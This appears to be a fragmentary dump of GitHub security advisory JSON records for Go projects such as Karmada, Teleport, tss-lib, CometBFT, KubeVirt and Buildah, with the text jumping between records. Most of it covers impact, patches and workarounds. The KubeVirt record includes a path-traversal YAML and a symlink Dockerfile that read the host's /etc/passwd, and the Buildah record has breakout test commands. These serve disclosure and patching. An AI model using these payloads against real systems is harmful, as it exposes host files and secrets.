The backend API endpoints (e.g., /api/v1/secret, /api/v1/service) did not enforce authentication, allowing unauthenticated users to access sensitive cluster information such as Secrets and Services directly. Although the web UI required a valid JWT for access, the API itself remained exposed to direct requests without any authentication checks. Any user or entity with network access to the Karmada Dashboard service could exploit this vulnerability to retrieve sensitive data.\n\n### Patches\nThe issue has been fixed in Karmada Dashboard v0.2.0. This release enforces authentication for all API endpoints. Users are strongly advised to upgrade to version v0.2.0 or later as soon as possible.\n\n### Workarounds\nIf upgrading is not immediately feasible, users can mitigate the risk by:\n\n- Restricting network access to the Karmada Dashboard service using Kubernetes Network Policies, firewall rules, or ingress controls.\n- Placing the Dashboard behind a reverse proxy that enforces authentication (e.g., OAuth2 proxy) to add an additional layer of security.\n\n### References\n- Karmada Dashboard v0.2.0 Release : https://github.com/karmada-io/dashboard/releases/tag/v0.2.0\n- Fix PR #271\n- Fix PR #280","affected":[{"package":{"name":"github.com/karmada-io/dashboard","ecosystem":"Go","purl":"pkg:golang/github.com/karmada-io/dashboard"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"0.2.0"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-5qjg-9mjh-4r92/GHSA-5qjg-9mjh-4r92.json"}}],"references":[{"type":"WEB","url":"https://github.com/karmada-io/dashboard/security/advisories/GHSA-5qjg-9mjh-4r92"},{"type":"WEB","url":"https://github.com/karmada-io/dashboard/pull/271"},{"type":"WEB","url":"https://github.com/karmada-io/dashboard/pull/280"},{"type":"PACKAGE","url":"https://github.com/karmada-io/dashboard"},{"type":"WEB","url":"https://github.com/karmada-io/dashboard/releases/tag/v0.2.0"}],"database_specific":{"cwe_ids":["CWE-862"],"github_reviewed":true,"github_reviewed_at":"2025-10-24T15:27:04Z","nvd_published_at":null,"severity":"CRITICAL"},"_metadata":{"fetched_at":"2026-01-27T01:17:40.299616Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-h2rp-8vpx-q9r4","published":"2025-03-13T16:26:11Z","modified":"2025-03-25T20:22:23.406725Z","aliases":["GO-2025-3520"],"summary":"cheqd-node Security patch for upstream vulnerabilities in IBC-Go (ISA-2025-001) and Cosmos SDK (ISA-2025-002)","details":"# Description\n\nThere have been two upstream security advisories and associated patches published under [ISA-2025-001](https://github.com/cosmos/ibc-go/security/advisories/GHSA-4wf3-5qj9-368v) and [ISA-2025-002](https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-47ww-ff84-4jrg).\n\n**[ISA-2025-001](https://github.com/cosmos/ibc-go/security/advisories/GHSA-4wf3-5qj9-368v)** affects the IBC-Go package., where non-deterministic JSON unmarshalling of IBC Acknowledgements can result in a chain halt. \n\n**[ISA-2025-002](https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-47ww-ff84-4jrg)** affects the Cosmos SDK package, where `x/group` can halt when erroring in `EndBlocker`.\n\n### Impact\nIf unaddressed, this could result in a chain halt.\n\n### Patches\nValidators, full nodes, and IBC relayers should upgrade to [cheqd-node v3.1.8](https://github.com/cheqd/cheqd-node/releases/tag/v3.1.8).

Any user that can open an IBC channel can introduce this state to the chain. The following patch is in addition to the previous patch which now extends the same protection to all applications beyond transfer.\n\n### Patches\n\nThe new IBC-Go releases below address this issue:\n\n* [v7.10.0](https://github.com/cosmos/ibc-go/releases/tag/v7.10.0)\n* [v8.7.0](https://github.com/cosmos/ibc-go/releases/tag/v8.7.0)\n\n### Workarounds\n\nTo prevent this state from being introduced to a chain, it is possible to permission Channel Opening as a workaround.\n\n### Notes on Re-Release\n\nThis is an extension of the previous patch, please update to the latest patch to get full coverage against the reported issue.\n\n#### Is this state breaking?\n\nThis patch is not state breaking unless an exploit is submitted before the patch is applied across the network in which case the chain will halt just as if it was unpatched. Thus, you can safely apply this patch in a rolling manner and encourage validators to patch as soon as possible in order to prevent any chain halts (and we've already cut new versions of these for you).\n\n#### Testing we have done to gain more confidence in this release\n* In addition to testing ibc-go, we also did the following:\n* Tested PFM v7 and v8 after bumping dependencies\n* Tested ibc-hooks v7 and v8 after bumping dependencies\n* Ran a patched node on Cosmos Hub Mainnet and triggered failing and successful transactions that used PFM\n* Ran a patched node on Osmosis mainnet and triggered failing and successful transactions that used ibc-hooks\nThis is a more thorough process than before, so we have higher confidence.\n\nThis issue was reported to the Cosmos Bug Bounty Program by swelf19 on HackerOne on February 18, 2025.

This release addresses all but one: a root proxy administrator with access to the root proxy credentials can make requests through leaf proxies in Trusted Clusters. This behavior will be restricted in future releases. For customers using Teleport in a Trusted Cluster configuration, we encourage leaf clusters to have network restrictions in place to mitigate SSRF. For example, we recommend restricting outbound network connections to only the Auth Service, your SSO provider, and any agents, databases or applications needed to be accessed from the proxy. If running in a cloud environment pay careful attention to what cloud resources are accessible from the proxy.\n\n### Patches\nFixed in versions 14.2.4, 13.4.13 and 12.4.31.\n\n### Workarounds\nStrict network controls from the Teleport Proxy and Teleport Agents reduce the potential exposure from this issue.\n\n### References\n* Fixed in PR: https://github.com/gravitational/teleport/pull/36127\n* https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#network-layer\n* https://www.cyber.gov.au/resources-business-and-government/maintaining-devices-and-systems/system-hardening-and-administration/network-hardening/implementing-network-segmentation-and-segregation\n","affected":[{"package":{"name":"github.com/gravitational/teleport","ecosystem":"Go","purl":"pkg:golang/github.com/gravitational/teleport"},"ranges":[{"type":"SEMVER","events":[{"introduced":"14.0.0"},{"fixed":"14.2.4"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/01/GHSA-hw4x-mcx5-9q36/GHSA-hw4x-mcx5-9q36.json"}},{"package":{"name":"github.com/gravitational/teleport","ecosystem":"Go","purl":"pkg:golang/github.com/gravitational/teleport"},"ranges":[{"type":"SEMVER","events":[{"introduced":"13.0.0"},{"fixed":"13.4.13"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/01/GHSA-hw4x-mcx5-9q36/GHSA-hw4x-mcx5-9q36.json"}},{"package":{"name":"github.com/gravitational/teleport","ecosystem":"Go","purl":"pkg:golang/github.com/gravitational/teleport"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"12.4.31"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/01/GHSA-hw4x-mcx5-9q36/GHSA-hw4x-mcx5-9q36.json"}}],"references":[{"type":"WEB","url":"https://github.com/gravitational/teleport/security/advisories/GHSA-hw4x-mcx5-9q36"},{"type":"WEB","url":"https://github.com/gravitational/teleport/pull/36127"},{"type":"WEB","url":"https://github.com/gravitational/teleport/commit/bb2d67d357e868254a21ed7cb132030d7bf9fcbc"},{"type":"PACKAGE","url":"https://github.com/gravitational/teleport"}],"database_specific":{"cwe_ids":[],"github_reviewed":true,"github_reviewed_at":"2024-01-03T21:28:37Z","nvd_published_at":null,"severity":"CRITICAL"},"_metadata":{"fetched_at":"2026-01-27T01:17:40.375791Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-76cc-p55w-63g3","published":"2024-01-03T21:29:09Z","modified":"2024-09-06T21:40:26Z","withdrawn":"2024-01-23T12:50:23Z","summary":"Withdrawn Advisory: Teleport Access List owners can escalate their privileges","details":"## Withdrawn Advisory\nThis advisory has been withdrawn because the vulnerability affects a binary, not a library in a [supported ecosystem](https://github.com/github/advisory-database#supported-ecosystems).

The Verifiable Secret Sharing scheme generates shares from the user’s IDs but does not properly validate them. Using a malicious ID will make other users reveal their secrets during the secret-sharing procedure. In addition, a second issue resulting from lack of validation could cause nodes to crash when sent maliciously formed user IDs.\n\n# Details\n\nThe creation of Parties IDs does not properly validate for maliciously chosen IDs. Parties generate the secret shares in `binance-chain/tss-lib` codebase that `keep-network/keep-ecdsa` uses by evaluating the polynomial with the other parties’ IDs. It is critical that these party ids are non-zero because evaluating the polynomial at point 0 reveals the secret.\n\nThere is a check that these ids are not zero, but this is insufficient since it is not performed modulo the curve order. Therefore, one can set their ID equal to the order of the elliptic curve, which equals 0 during the polynomial evaluation modulo the curve order.\n```\n    shares := make(Shares, num)\n    for i := 0; i < num; i++ {\n        if indexes[i].Cmp(big.NewInt(0)) == 0 {\n            return nil, nil, fmt.Errorf(\"party index should not be 0\")\n        }\n        share := evaluatePolynomial(ec, threshold, poly, indexes[i])\n        shares[i] = &Share{Threshold: threshold, ID: indexes[i], Share: share}\n    }\n```\n(https://github.com/binance-chain/tss-lib/blob/73560daec7f83d7355107ea9b5e59d16de8765be/crypto/vss/feldman_vss.go#L64-L70)\n\nThus, a party with an ID equal to the order of the curve will receive the secret key as its share.\n\nAnother issue with the tss-lib implementation was the lack of verification for modularly equal user IDs that can cause nodes to crash during key generation or resharing.\n\n# Timeline\n\n### 6 December 2021, 20:28 CET\nThe team is informed by Trail of Bits about the issue in `binance-chain/tss-lib`. The vulnerability was already disclosed with Binance and they have implemented fixes in their recent commits. We are advised to update our dependency to the most recent `binance-chain/tss-lib` version.\n\n### 7 December 2021, 9:10 CET\nThe team confirms with Trail of Bits we started the work on a fix.\n\n### 7 December 2021, 20:03 CET\nThe team informs Trail of Bits that we found a potential problem in Binance's fix that may lead to the signing code failing with Go panic. We identified the problematic line and suggested its removal.\n\nTo address the vulnerability in the protocol, it is required to ensure that:\n- all indexes are non-zero,\n- all indexes are non-zero modulo the curve order,\n- all indexes are unique modulo the curve order.\n\nThe first two are guarded in `CheckIndexes` function by:\n```\nvMod := new(big.Int).Mod(v, ec.Params().N)\nif vMod.Cmp(zero) == 0 {\n  return nil, errors.New(\"party index should not be 0\")\n}\n```\nThe last one is guarded by:\n```\nif sortutil.Dedupe(sortutil.BigIntSlice(dup)) < len(indexes) {\n  return nil, errors.New(\"duplicate in indexes\")\n}\n```\nHowever, `CheckIndexes` was additionally modified to update values of passed indexes by doing `indexes[i] = vMod`.\n\nThis line was not backward-compatible and caused signatures to fail with `panic: runtime error: invalid memory address or nil pointer dereference` in case the signing group was generated with at least one `PartyID.Key` higher than `ec.Params().N`. This would also be problematic for new code that constructs such `PartyID` - we tested that key generation completed successfully but signing failed with the mentioned panic.\n\n### 8 December 2021, 12:49 CET\nTrail of Bits confirmed the line we flagged is not critical to the security of the protocol.\n\n### 8 December 2021, 15:29 CET\nThe team informed Trail of Bits we are planning to open a PR to `binance-chain/tss-lib` with a fix and we suggest extending the embargo for communicating this issue for one more week, until Friday, Dec 17h to give everyone more time update their code given the problem was found. We also ask Trail of Bits to get in touch with Binance to review our fix given that we are not going to provide a sufficient explanation in the commit and PR description to do not threaten the security of projects that have already upgraded their dependency.\n\n### 8 December 2021, 18:17 CET\n\nThe team informs Trail of Bits about opening a PR https://github.com/binance-chain/tss-lib/pull/155 and explains all the details of the issue.\n\nThe problematic scenario is:\n\n1. We start the keygen by creating `PartyID` for each member. The `PartyID` struct has `Id` and `Key` fields. We set `PartyID.Key` that is higher than the elliptic curve's `N`.\n2. This goes to tss-lib which starts the round 1 code (`ecdsa/keygen/round_1.go`). It takes `PartyID.Key` of each member and assembles the `ids` slice. This slice is thrown into `CheckIndexes` which overwrites each element by doing the modulo `N`.\n3. After returning from `CheckIndexes` the modified `ids` slice is used to set the `Ks` slice in the final `LocalPartySaveData` which is received by each group member as keygen final result.\n4. Each member takes this `LocalPartySaveData` and saves it on disk.\n5. Upon signing, we do the same as in point 1, so we construct `PartyID`s in the same way and start the protocol. At this point, `PartyID.Key` is higher than curve's `N`.\n6. Before starting round 1 of signing, `LocalPartySaveData` obtained at keygen and our `PartyID`s built at point 5 are used in `BuildLocalSaveDataSubset` to build a new `LocalPartySaveData` instance.\n7. `BuildLocalSaveDataSubset` is the place where things go wrong because `Key` field of each `PartyID` from point 5 doesn't correspond to encoded `Ks` elements of `LocalPartySaveData` obtained after keygen, the final `LocalPartySaveData` is corrupted, and cause panic upon validation before signing round 1.\n\n### 8 December 2021, 21:50 CET\n\nTrail of Bits confirms they are going to followup with Binance and they agree to extend the embargo by a week.\n\n### 8 December 2021, 15:16 CET\n\nTrail of Bits validates the problematic scenario we described and our fix. Trail of Bits reaches to Binance and recommends merging our fix and in addition to some other fixes that would secure the code to do not panic even if `LocalPartySaveData` has corrupted data.\n\n### 10 December 2021, 8:16 CET\n\nBinance merges our fix https://github.com/binance-chain/tss-lib/commit/cd95cee01ea2af6d4aa8316612803be944d5369a\n\n### 13 December 2021, 8:35 CET\n\nBinance applies more fixes so that even in case of `LocalPartySaveData` corrupted, the code is not going to panic.\n\n### 15 December 2021\n\nThe team releases a new version of the client, v1.8.1, and announces the need for an upgrade.\nhttps://github.com/keep-network/keep-ecdsa/releases/tag/v1.8.1","affected":[{"package":{"name":"github.com/keep-network/keep-ecdsa","ecosystem":"Go","purl":"pkg:golang/github.com/keep-network/keep-ecdsa"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"1.8.1"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/01/GHSA-gp6j-vx54-5pmf/GHSA-gp6j-vx54-5pmf.json"}}],"references":[{"type":"WEB","url":"https://github.com/keep-network/keep-ecdsa/security/advisories/GHSA-gp6j-vx54-5pmf"},{"type":"PACKAGE","url":"https://github.com/keep-network/keep-ecdsa"},{"type":"WEB","url":"https://github.com/keep-network/keep-ecdsa/releases/tag/v1.8.1"}],"database_specific":{"cwe_ids":[],"github_reviewed":true,"github_reviewed_at":"2022-01-04T22:41:52Z","nvd_published_at":null,"severity":"CRITICAL"},"_metadata":{"fetched_at":"2026-01-27T01:17:40.365406Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-62mh-w5cv-p88c","published":"2022-02-15T00:42:28Z","modified":"2024-05-21T15:22:54Z","aliases":["BIT-nats-2021-3127","CVE-2021-3127","GHSA-9r5x-fjv3-q6h4","GHSA-j756-f273-xhp4","GO-2022-0386"],"related":["CGA-wg3j-593x-7xrc"],"summary":"nats-io/jwt not enforcing checking of Import token permissions","details":"(This advisory is canonically <https://advisories.nats.io/CVE/CVE-2021-3127.txt>)\n\n## Problem Description\n\nThe NATS server provides for Subjects which are namespaced by Account; all Subjects are supposed to be private to an account, with an Export/Import system used to grant cross-account access to some Subjects.

Additional validation was added to prevent this condition from happening.\n\n### Patches\n\nThe new CometBFT releases [v1.0.1](https://github.com/cometbft/cometbft/releases/tag/v1.0.1) and [v0.38.17](https://github.com/cometbft/cometbft/releases/tag/v0.38.17) fix this issue.\n\nUnreleased code in the main branch is patched as well.\n\n### Workarounds\n\nThere are no known workarounds for this issue. If a node is producing these malicious proofs, the only mitigation is to upgrade CometBFT. After upgrading, the validators then will eventually conclude the correct value.\n\n### Technical Deep-Dive\n\nWhen the next proposer creates a block, it is split into many block parts (64kB each). Each block part is then disseminated via p2p layer in a gossip fashion. The block part contains the following fields:\n\n```go\ntype Part struct {\n\tIndex uint32            `json:\"index\"`\n\tBytes cmtbytes.HexBytes `json:\"bytes\"`\n\tProof merkle.Proof      `json:\"proof\"`\n}\n```\n\n- `Index` - represents the index of a block part\n- `Bytes` - the actual content\n- `Proof` - Merkle proof, which allows the receiving node to quickly verify that a `Part` is indeed a piece of the proposed block.\n\nThe `Proof` contains the following fields:\n\n```go\ntype Proof struct {\n\tTotal    int64    `json:\"total\"`           // Total number of items.\n\tIndex    int64    `json:\"index\"`           // Index of item to prove.\n\tLeafHash []byte   `json:\"leaf_hash\"`       // Hash of item value.\n\tAunts    [][]byte `json:\"aunts,omitempty\"` // Hashes from leaf's sibling to a root's child.\n}\n```\n\nNote that the total number of leaves in the Merkle tree equals the number of parts in the proposed block. Previously, CometBFT did not validate the `Index` field and specifically that `Part.Index` must be equal to `Part.Proof.Index`. This leads to a condition where, it is possible to use the proof from a different part and CometBFT accept it, even though the proof proves the different part is a piece of the proposed block and not the part that the peer actually sent to us.\n\nThis condition is problematic because: \n\n1. it would disseminate the invalid block part to its neighboring nodes (because it deemed it as correct)\n2. it would mark the block part as received and ask the neighboring nodes not to relay it in the future, making it impossible to receive the correct block part.\n\nTo address this, CometBFT was patched to verify that `Part.Index` is equal to `Part.Proof.Index`, preventing the above condition.\n\n### Timeline\n\n* January 15, 2025, 12:12pm PST: Issue reported to the Cosmos Bug Bounty program\n* January 15, 2025, 12:31pm PST: Issue triaged by Amulet on-call, and distributed to Core team\n* January 27, 2025, 11:28pm PST: Core team completes validation of issue\n* January 31, 2024, 2:15pm PST: Pre-notification delivered\n* February 3rd, 2024, 9:00am UTC+4: Patch made available\n\nThis issue was reported by [unknown_feature](https://github.com/unknownfeature) to the Cosmos Bug Bounty Program on HackerOne on January 15, 2025.

Secret share recovery attack\n\nIf the base OT setup of the protocol is reused for another execution of the OT extension, then a malicious participant can extract a bit of the secret of another participant. By repeating the execution they can eventually recover the whole secret.\n\nTherefore, unlike our comments suggested, you **must not reuse an OT setup** for multiple protocol executions. \n\nWe're adding a warning in the code:\n\nhttps://github.com/taurushq-io/multi-party-sig/blob/9e4400fccee89be6195d0a12dd0ed052288d5040/internal/ot/extended.go#L114\n\n### 2. Invalid security proof due to incorrect operator\n\nThe original 2018 version of the DKLS had a typo in the OT extension protocol when computing the check value in the OT extension: the paper noted a XOR whereas it should be a field multiplication. This erroneous behavior was implemented [in our code](https://github.com/taurushq-io/multi-party-sig/blob/4d84aafb57b437da1b933db9a265fb7ce4e7c138/internal/ot/extended.go#L188). \n\nThe proof of security fails in this case. No concrete attack is known, however.\n\nThe [2023 update](https://eprint.iacr.org/2018/499.pdf) of the DKLS paper reported that typo and updated the protocol definition.\n\n~As of 20241124, patching is in progress (branch [otfix](https://github.com/taurushq-io/multi-party-sig/tree/otfix)), but not merged to the main branch yes as the tests fail to pass. We're troubleshooting the issue and will merge into the main branch when it's resolved.~\n\nAs of 20250128, a patched version is available in https://github.com/taurushq-io/multi-party-sig/releases/tag/v0.7.0-alpha-2025-01-28, thanks to https://github.com/taurushq-io/multi-party-sig/pull/119.\n\n### Workarounds\n\nDo not reuse an OT setup in the event that an abort is detected, to eliminate the secret recovery attack.\n  \n\n### Credits\n\nThanks to the Coinbase researchers Yi-Hsiu Chen and Samuel Ranellucci for discovering these issues and providing a comprehensive write-up.

This field is used to authenticate the user sending the message to the system. However, there was no validation on the ICS side to check if the signer matches the provider address.  \n\nAs a result, any user could opt-in, opt-out, change the commission rate, or change what public key a validator uses on a consumer chain. \n\nFor more context, check out the code:\n\n- proto files https://github.com/cosmos/interchain-security/blob/v5.1.1/proto/interchain_security/ccv/provider/v1/tx.proto#L52\n- message validation https://github.com/cosmos/interchain-security/blob/v5.1.1/x/ccv/provider/types/msg.go#L106\n- message handling https://github.com/cosmos/interchain-security/blob/v5.1.1/x/ccv/provider/keeper/msg_server.go#L52\n\n### Severity assessment\n\nThe severity assessment is based on [this framework](https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md). \n\n**Potential impact:** Catastrophic \n\n- By changing consumer keys for 1/3+ of a consumer chain's validator set, any user could cause a consumer chain to halt. Given that the consumer is down, the provider will jail provider validators for consumer downtime, so this exploit would not have impacted the provider directly. Consumer chain halts would need to be addressed by a provider-side patch.\n- By changing consumer keys on a consumer node, double signing, and submitting evidence back to the provider, any user could tombstone any provider validator. This would cause the provider's active set to change. At scale, this exploit could be applied to all active provider validators and a well-funded attacker could then run their own nodes and take over consensus on the provider and on consumer chains.\n\n**Likelihood:** Rare\n\n- The bug was discovered internally. There is no evidence that any external party has identified this vulnerability. \n- The bug has been live for two weeks with no issues. \n- All four message types are ones that only validators use, and rarely use in daily operations.\n- In the Cosmos Hub’s recent history (May - Aug), there has been only one instance of any of these message types, which was performed in accordance with chain rules.\n- The catastrophic exploits (such as tombstoning the entire validator set of the provider) are also extremely complex. They involve several operations that are not well-understood by many people, and the entire exploit must occur quickly and at-scale to avoid other node operators responding defensively.","affected":[{"package":{"name":"github.com/cosmos/interchain-security/v5","ecosystem":"Go","purl":"pkg:golang/github.com/cosmos/interchain-security/v5"},"ranges":[{"type":"SEMVER","events":[{"introduced":"5.1.0"},{"fixed":"5.2.0"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-7q74-g774-7x3g/GHSA-7q74-g774-7x3g.json"}},{"package":{"name":"github.com/cosmos/interchain-security","ecosystem":"Go","purl":"pkg:golang/github.com/cosmos/interchain-security"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-7q74-g774-7x3g/GHSA-7q74-g774-7x3g.json"}},{"package":{"name":"github.com/cosmos/interchain-security/v2","ecosystem":"Go","purl":"pkg:golang/github.com/cosmos/interchain-security/v2"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-7q74-g774-7x3g/GHSA-7q74-g774-7x3g.json"}},{"package":{"name":"github.com/cosmos/interchain-security/v3","ecosystem":"Go","purl":"pkg:golang/github.com/cosmos/interchain-security/v3"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-7q74-g774-7x3g/GHSA-7q74-g774-7x3g.json"}},{"package":{"name":"github.com/cosmos/interchain-security/v4","ecosystem":"Go","purl":"pkg:golang/github.com/cosmos/interchain-security/v4"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-7q74-g774-7x3g/GHSA-7q74-g774-7x3g.json"}}],"references":[{"type":"WEB","url":"https://github.com/cosmos/interchain-security/security/advisories/GHSA-7q74-g774-7x3g"},{"type":"PACKAGE","url":"https://github.com/cosmos/interchain-security"}],"database_specific":{"cwe_ids":[],"github_reviewed":true,"github_reviewed_at":"2024-09-05T21:19:36Z","nvd_published_at":null,"severity":"HIGH"},"_metadata":{"fetched_at":"2026-01-27T01:17:40.317147Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-c9v7-wmwj-vf6x","published":"2024-01-03T21:29:33Z","modified":"2024-09-06T21:40:24Z","withdrawn":"2024-01-23T12:50:08Z","summary":"Withdrawn Advisory: SFTP is possible on the Proxy server for any user with SFTP access","details":"## Withdrawn Advisory\nThis advisory has been withdrawn because the vulnerability affects a binary, not a library in a [supported ecosystem](https://github.com/github/advisory-database#supported-ecosystems).

There are three main attack vectors:\n\n1. Some path fields on the VMI spec were not properly validated and allowed passing in relative paths which would have been mounted into the virt-launcher pod. The fields are: `spec.domain.firmware.kernelBoot.container.kernelPath`, `spec.domain.firmware.kernelBoot.container.initrdPath` as well as `spec.volumes[*].containerDisk.path`.\n\nExample:\n\n```yaml\napiVersion: [kubevirt.io/v1](http://kubevirt.io/v1)\nkind: VirtualMachineInstance\nmetadata:\n  name: vmi-fedora\nspec:\n  domain:\n    devices:\n      disks:\n      - disk:\n          bus: virtio\n        name: containerdisk\n      - disk:\n          bus: virtio\n        name: cloudinitdisk\n      - disk:\n          bus: virtio\n        name: containerdisk1\n      rng: {}\n    resources:\n      requests:\n        memory: 1024M\n  terminationGracePeriodSeconds: 0\n  volumes:\n  - containerDisk:\n      image: [quay.io/kubevirt/cirros-container-disk-demo:v0.52.0](http://quay.io/kubevirt/cirros-container-disk-demo:v0.52.0)\n    name: containerdisk\n  - containerDisk:\n      image: [quay.io/kubevirt/cirros-container-disk-demo:v0.52.0](http://quay.io/kubevirt/cirros-container-disk-demo:v0.52.0)\n      path: test3/../../../../../../../../etc/passwd\n    name: containerdisk1\n  - cloudInitNoCloud:\n      userData: |\n        #!/bin/sh\n        echo 'just something to make cirros happy'\n    name: cloudinitdisk\n```\n\n2. Instead of passing in relative links on the API, using malicious links in the containerDisk itself can have the same effect:\n\n```Dockerfile\nFROM <anybase>\nRUN mkdir -p /etc/ && touch /etc/passwd\nRUN mkdir -p /disks/ && ln -s /etc/passwd /disks/disk.img\n```\n\n3. KubeVirt allows PVC hotplugging. The hotplugged PVC is under user-control and it is possible to place absolute links there. Since containerDisk and hotplug code use the same mechanism to provide the disk to the virt-launcher pod, it can be used too to do arbitrary host file reads.\n\nIn all three cases it is then possible to at lest read any host file:\n\n```\n$ sudo cat /dev/vdc\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n[...]\n```\n\n\n### Patches\n\nKubeVirt 0.55.1 provides patches to fix the vulnerability.\n\n\n### Workarounds\n\n* Ensure that the `HotplugVolumes` feature-gate is disabled\n* ContainerDisk support can't be disabled. The only known way to mitigate this issue is create with e.g. policy controller a conditiontemplate which ensures that no containerDisk gets added and that `spec.domain.firmware.kernelBoot` is not used on VirtualMachineInstances.|\n* Ensure that SELinux is enabled. It blocks most attempts to read host files but does not provide a 100% guarantee (like vm-to-vm read may still work).\n\n### References\n\n\nDisclosure notice form the discovering party: https://github.com/google/security-research/security/advisories/GHSA-cvx8-ppmc-78hm\n\n### For more information\n\nFor interested vendors which have to provide a fix for their supported versions, the following PRs are providing the fix:\n\n * https://github.com/kubevirt/kubevirt/pull/8198\n * https://github.com/kubevirt/kubevirt/pull/8268\n \n### Credits\nOliver Brooks and James Klopchic of NCC Group\nDiane Dubois and Roman Mohr of Google\n","affected":[{"package":{"name":"kubevirt.io/kubevirt","ecosystem":"Go","purl":"pkg:golang/kubevirt.io/kubevirt"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0.20.0"},{"fixed":"0.55.1"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-qv98-3369-g364/GHSA-qv98-3369-g364.json"}}],"references":[{"type":"WEB","url":"https://github.com/google/security-research/security/advisories/GHSA-cvx8-ppmc-78hm"},{"type":"WEB","url":"https://github.com/kubevirt/kubevirt/security/advisories/GHSA-qv98-3369-g364"},{"type":"WEB","url":"https://github.com/kubevirt/kubevirt/pull/8198"},{"type":"WEB","url":"https://github.com/kubevirt/kubevirt/pull/8268"},{"type":"PACKAGE","url":"https://github.com/kubevirt/kubevirt"}],"database_specific":{"cwe_ids":[],"github_reviewed":true,"github_reviewed_at":"2022-09-15T03:20:35Z","nvd_published_at":null,"severity":"HIGH"},"_metadata":{"fetched_at":"2026-01-27T01:17:40.407329Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-j92c-mmf7-j5x5","published":"2022-10-18T17:27:36Z","modified":"2024-08-21T16:28:58.799996Z","aliases":["GO-2022-1066"],"summary":"Potential inter-blockchain communication (IBC) protocol compromise via \"Dragonberry\" vulnerability in cheqd","details":"### Impact\nThis vulnerability affects IBC transfers due to a security vulnerability dubbed \"Dragonberry\" upstream in [Cosmos SDK](https://github.com/cosmos/cosmos-sdk/releases/tag/v0.45.9).

Be sure to remove those two files between tests.  \n\n```\nbuildah rm -a\nbuildah rmi -a\nrm /BIND_BREAKOUT\nrm /etc/BIND_BREAKOUT2\nsetenforce 1\nbuildah build -f ~/cve_Containerfile .\n```\nNeither the `/BIND_BREAKEOUT` or `/etc/BIND_BREAKOUT2` files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the `/etc/passwd` file, and nothing will be displayed from that file.  \n\nHowever, the files in both the `/` and `/etc` directories on the host system will be displayed.\n\n##### Testing with the patch\n\nUse the same commands as testing with an older version of Buildah.\n\nWhen running using the patched version of Buildah, regardless of the `setenforce` settings,  you should not see the file that you created or the user that you added.  Also the `/BIND_BREAKOUT` and the `/etc/BIND_BREAKOUT` will not exist on the host after the test completes.\n\nNOTE: With the fix, the contents of the `/` and `/etc` directories, and the `/etc/passwd` file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the `/BIND_BREAKOUT` and `/etc/BIND_BREAKOUT` files will be created in the container image.\n\n\n### Workarounds\nEnsure selinux controls are in place to avoid compromising sensitive system files and systems.  With \"setenforce 0\" set, which is not at all advised, the root file system is open for modification with this exploit.  With \"setenfoce 1\" set, which is the recommendation, files can not be changed.  However, the contents of the `/` directory can be displayed.  I.e., `ls -alF /` will show the contents of the host directory.\n\n### References\n\nUnknown.\n","affected":[{"package":{"name":"github.com/containers/buildah","ecosystem":"Go","purl":"pkg:golang/github.com/containers/buildah"},"ranges":[{"type":"SEMVER","events":[{"introduced":"1.35.0"},{"fixed":"1.35.1"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-pmf3-c36m-g5cf/GHSA-pmf3-c36m-g5cf.json"}},{"package":{"name":"github.com/containers/buildah","ecosystem":"Go","purl":"pkg:golang/github.com/containers/buildah"},"ranges":[{"type":"SEMVER","events":[{"introduced":"1.34.0"},{"fixed":"1.34.3"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-pmf3-c36m-g5cf/GHSA-pmf3-c36m-g5cf.json"}},{"package":{"name":"github.com/containers/buildah","ecosystem":"Go","purl":"pkg:golang/github.com/containers/buildah"},"ranges":[{"type":"SEMVER","events":[{"introduced":"1.33.0"},{"fixed":"1.33.7"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-pmf3-c36m-g5cf/GHSA-pmf3-c36m-g5cf.json"}},{"package":{"name":"github.com/containers/buildah",